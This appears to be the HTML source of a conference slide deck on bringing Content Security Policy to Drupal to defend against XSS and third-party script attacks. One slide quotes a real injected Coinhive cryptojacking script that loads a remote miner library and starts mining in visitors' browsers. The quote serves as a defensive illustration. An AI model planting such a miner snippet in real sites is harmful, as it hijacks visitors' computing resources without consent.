<!doctype html>
<html prefix="og: http://ogp.me/ns#">
<head>
	<meta charset="utf-8">
	<meta http-equiv="Content-Security-Policy" content="default-src 'self'; object-src 'none'; frame-ancestors 'none'">
	<meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">

	<title>Bringing Content Security Policy to Drupal</title>

	<link rel="stylesheet" href="lib/css/font-awesome.min.css">
	<link rel="stylesheet" href="css/reveal.css">
	<link rel="stylesheet" href="css/theme/myplanet.css">
	<link rel="stylesheet" href="css/presentation.css">

	<!-- Theme used for syntax highlighting of code -->
	<link rel="stylesheet" href="lib/css/highlight-github.css">

	<link rel="icon" href="lib/myplanet/logo/radiant-orange/mark-knockout.svg"/>

	<meta property="og:url" content="https://gapple.github.io/presentation-csp-dc-seattle/" />
	<meta property="og:title" content="Bringing Content Security Policy to Drupal" />
	<meta property="og:image" content="https://gapple.github.io/presentation-csp-dc-seattle/images/facebook-card.png" />
	<meta name="twitter:card" content="summary_large_image">
	<meta name="twitter:creator" content="@gappleca">
	<meta name="twitter:image" content="https://gapple.github.io/presentation-csp-dc-seattle/images/twitter-card.png">

	<script src="js/reveal-print.js"></script>
</head>
<body>
<div class="reveal pattern--random">
	<div class="slides">
		<section>
			<section class="title" id="title">
				<div class="grid-wrapper">
					<div class="header">
						<div class="logo logo--full"><span class="visually-hidden">Myplanet</span></div>
					</div>
					<div class="content">
						<div>
							<h2>Is your site really safe from XSS?</h2>
							<h1>Bringing Content Security Policy to Drupal</h1>
						</div>
						<div class="description">
							Drupalcon Seattle
						</div>
					</div>
					<div class="credit">
						<hr>
						<div class="name">Geoff Appleby</div>
					</div>
					<a class="presentation-url" href="https://gapple.github.io/presentation-csp-dc-seattle/">https://gapple.github.io/presentation-csp-dc-seattle/</a>
				</div>
			</section>
		</section>

		<section>
			<section id="are-you-afraid" class="screenshot full">
				<div class="grid-wrapper">
					<video>
						<source src="images/are-you-afraid.mp4" type="video/mp4" />
					</video>
				</div>
			</section>
			<section>
				<div class="grid-wrapper">
					<div class="header">
						<div class="logo"></div>
						<div class="twitter"><a href="https://twitter.com/gappleca"><i class="fa fa-twitter"></i> <span>gappleca</span></a></div>
					</div>

					<figure class="code">
						<pre><code class="lang-html" data-escape>
							&lt;script src="https://cdn.example.com/script.js" async&gt;&lt;/script&gt;
						</code></pre>
					</figure>
				</div>
			</section>

			<section id="coinhive">
				<div class="grid-wrapper">
					<div class="header">
						<div class="logo"></div>
						<div class="twitter"><a href="https://twitter.com/gappleca"><i class="fa fa-twitter"></i> <span>gappleca</span></a></div>
					</div>

					<figure class="code">
						<pre><code class="lang-js">
							/* [Warning] Do not copy or self host this file, you will not be supported */ <br/><br/>

							<span class="fragment">
							window["document"]["write"]("&lt;script type='text/javascript' src='https://coinhive.com/lib/coinhive.min.js?rnd="+window["Math"]["random"]()+"'&gt;&lt;/script&gt;");window["document"]["write"]('&lt;script&gt; if (navigator.hardwareConcurrency &gt; 1){ var cpuConfig = {threads: Math.round(navigator.hardwareConcurrency/3),throttle:0.6}} else { var cpuConfig = {threads: 8,throttle:0.6}} var miner = new CoinHive.Anonymous(\'1GdQGpY1pivrGlVHSp5P2IIr9cyTzzXq\', cpuConfig);miner.start();&lt;/script&gt;');
							</span>
						</code></pre>
					</figure>
				</div>
			</section>

			<section id="do-you-know">
				<div class="grid-wrapper">
					<figure>
						<span class="do-you-know--time">10<br/>PM</span>
						<span class="do-you-know--where">Do you know where your data is?</span>
					</figure>
				</div>
			</section>

			<section class="references">
				<div class="grid-wrapper">
					<div class="header">
						<div class="logo"></div>
						<span>References</span>
						<div class="twitter"><a href="https://twitter.com/gappleca"><i class="fa fa-twitter"></i> <span>gappleca</span></a></div>
					</div>

					<ul>
						<li><a href="https://hackernoon.com/im-harvesting-credit-card-numbers-and-passwords-from-your-site-here-s-how-9a8cb347c5b5 ">I’m harvesting credit card numbers and passwords from your site. Here’s how.<br> - David Gilbertson</a></li>
						<li><a href="https://www.troyhunt.com/the-javascript-supply-chain-paradox-sri-csp-and-trust-in-third-party-libraries/ ">The JavaScript Supply Chain Paradox: SRI, CSP and Trust in Third Party Libraries<br> - Troy Hunt</a></li>
						<li><a href="https://scotthelme.co.uk/protect-site-from-cryptojacking-csp-sri/">Protect your site from Cryptojacking with CSP + SRI<br> - Scott Helme</a></li>
						<li><a href="https://medium.com/@efkan162/how-i-xssed-uber-and-bypassed-csp-9ae52404f4c5">How I XSS’ed Uber and Bypassed CSP<br> - Efkan</a></li>
						<li><a href="https://krebsonsecurity.com/2018/11/whos-in-your-online-shopping-cart/">Who’s In Your Online Shopping Cart?<br> - KrebsOnSecurity</a></li>
						<li><a href="https://www.tripwire.com/state-of-security/featured/magecart-hundreds-websites-supply-chain-hijack/">Magecart hits hundreds of websites via ad supply chain hijack<br> - Graham Cluley</a></li>
					</ul>
				</div>
			</section>
		</section>

		<section>
			<section id="xss-titlefield" class="screenshot full">
				<div class="grid-wrapper">
					<img src="images/xss-titlefield.png" alt="Drupal node creation page, with XSS attempt in the title field"/>
				</div>
			</section>
			<section id="xss-admin" class="screenshot full">
				<div class="grid-wrapper">
					<img src="images/xss-admin.png" alt="Drupal administration page, with field for script to be added inline on every page"/>
				</div>
			</section>
			<section id="security-adviory" class="screenshot full">
				<div class="grid-wrapper">
					<img src="images/security-advisory.png" alt="Drupal XSS Security Advisory"/>
				</div>
			</section>
		</section>

		<section>
			<section id="security-layers" class="screenshot full cover">
				<div class="grid-wrapper">
					<figure class="meme shrek-like-an-onion">
						<img src="images/onion-layers/000.png" alt="Web security is like an onion" />
						<h1>Web security is like an onion</h1>
					</figure>
					<figure class="meme shrek-it-stinks fragment">
						<img src="images/onion-layers/002.png" alt="It stinks?" />
						<h1>It stinks?</h1>
					</figure>
					<figure class="meme shrek-layers fragment">
						<img src="images/onion-layers/004.png" alt="Layers!" />
						<h1>Layers!</h1>
					</figure>
				</div>
			</section>
		</section>

		<section>
			<section class="subsection">
				<div class="grid-wrapper">
					<div class="header">
						<div class="logo"></div>
						<div class="twitter"><a href="https://twitter.com/gappleca"><i class="fa fa-twitter"></i> <span>gappleca</span></a></div>
					</div>
					<h1>The HTTP Content-Security-Policy response header allows web site administrators to control
						resources the user agent is allowed to load for a given page.
					</h1>
					<div class="description">
						<a href="https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Content-Security-Policy">MDN web docs: Content-Security-Policy</a>
					</div>
				</div>
			</section>
			<section id="csp-support">
				<div class="grid-wrapper">
					<div class="header">
						<div class="logo"></div>
						<div class="twitter"><a href="https://twitter.com/gappleca"><i class="fa fa-twitter"></i> <span>gappleca</span></a></div>
					</div>
					<figure>
						<table>
							<tr class="browsers">
								<th></th>
								<th><i class="fa fa-chrome"></i></th>
								<th><i class="fa fa-firefox"></i></th>
								<th><i class="fa fa-safari"></i></th>
								<th><i class="fa fa-edge"></i></th>
								<th><i class="fa fa-internet-explorer"></i></th>
							</tr>
							<tr class="level1">
								<th>1</th>
								<td><i class="fa fa-check yes"></i></td>
								<td><i class="fa fa-check yes"></i></td>
								<td><i class="fa fa-check yes"></i></td>
								<td><i class="fa fa-check yes"></i></td>
								<td><i class="fa fa-times warning"></i></td>
							</tr>
							<tr class="level2 fragment">
								<th>2</th>
								<td><i class="fa fa-check yes"></i></td>
								<td><i class="fa fa-check yes"></i></td>
								<td><i class="fa fa-check yes"></i></td>
								<td><i class="fa fa-check yes"></i></td>
								<td><i class="fa fa-times no"></i></td>
							</tr>
							<tr class="level3 fragment">
								<th>3</th>
								<td><i class="fa fa-check warning"></i></td>
								<td><i class="fa fa-check warning"></i></td>
								<td><i class="fa fa-times warning"></i></td>
								<td><i class="fa fa-times warning"></i></td>
								<td><i class="fa fa-times no"></i></td>
							</tr>
						</table>
					</figure>
				</div>
				<aside class="notes">
					Level 1 Published February 2015
					Level 2 Published December 2016
					Most recent browser to add support was Edge in 2015
					IE only supports sandbox directive
				</aside>
			</section>
			<section id="csp-module" class="screenshot full">
				<div class="grid-wrapper">
					<img src="images/csp-module.png" alt="Project page for the content security policy module"/>
				</div>
			</section>
			<section id="csp-config" class="screenshot full">
				<div class="grid-wrapper">
					<img src="images/csp-config.png" alt="The configuration page for the content security policy module"/>
				</div>
			</section>
		</section>

		<section>
			<section class="screenshot full">
				<div class="grid-wrapper">
					<img src="images/core-ckeditor-csp.png" alt="Drupal core issue for CKEditor 4 requiring unsafe-inline CSP policy" />
				</div>
			</section>
			<section class="screenshot full">
				<div class="grid-wrapper">
					<img src="images/core-ckeditor-5.png" alt="Drupal core issue to update CKEditor to version 5" />
				</div>
			</section>
		</section>

		<section>
			<section>
				<div class="grid-wrapper">
					<div class="header">
						<div class="logo"></div>
						<div class="twitter"><a href="https://twitter.com/gappleca"><i class="fa fa-twitter"></i> <span>gappleca</span></a></div>
					</div>
					<div class="content">
						<h1>More To Explore</h1>
						<ul>
							<li>Subresource Integrity (SRI)</li>
							<li><a href="https://www.drupal.org/project/featurepolicy">Feature Policy</a></li>
							<li>Reporting API
								<ul>
									<li>Network Error Logging</li>
									<li>Deprecation & Intervention</li>
								</ul>
							</li>
							<li>Certificate Transparency & Expect-Staple</li>
						</ul>
					</div>
				</div>
			</section>
		</section>

		<section id="end" class="color--midnight">
			<div class="grid-wrapper">
				<div class="content">
					<a href="https://twitter.com/gappleca"><i class="fa fa-twitter"></i> <span>gappleca</span></a>
				</div>
			</div>
		</section>
	</div>
</div>

<script src="lib/js/head.min.js"></script>
<script src="js/reveal.js"></script>
<script src="js/reveal-init.js"></script>
</body>
</html>
